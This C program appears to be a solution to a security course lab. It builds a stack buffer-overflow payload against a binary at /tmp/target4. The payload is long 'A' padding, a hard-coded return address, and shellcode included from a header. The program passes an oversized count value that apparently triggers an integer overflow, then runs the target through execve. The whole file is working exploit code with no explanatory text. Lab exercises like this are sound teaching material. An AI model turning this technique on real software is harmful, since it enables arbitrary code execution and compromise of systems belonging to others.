#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

#define LEN 20200 // 1000 * 20 + 200

char payload[LEN];

void make_payload() {
  for (int i = 0; i < LEN; i++) {
    payload[i] = 'A';
  }
  payload[20004] = 0x68;
  payload[20005] = 0xaf;
  payload[20006] = 0xff;
  payload[20007] = 0xbf;
  strncpy(payload + 20008, shellcode, 46);
  payload[20053] = 'A';
  payload[LEN - 1] = 0x0;
}

int main(void) {
  char input[20220];
  make_payload();
  sprintf(input, "%s,%s", "2147484658", payload);
  char *args[] = { TARGET, input, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
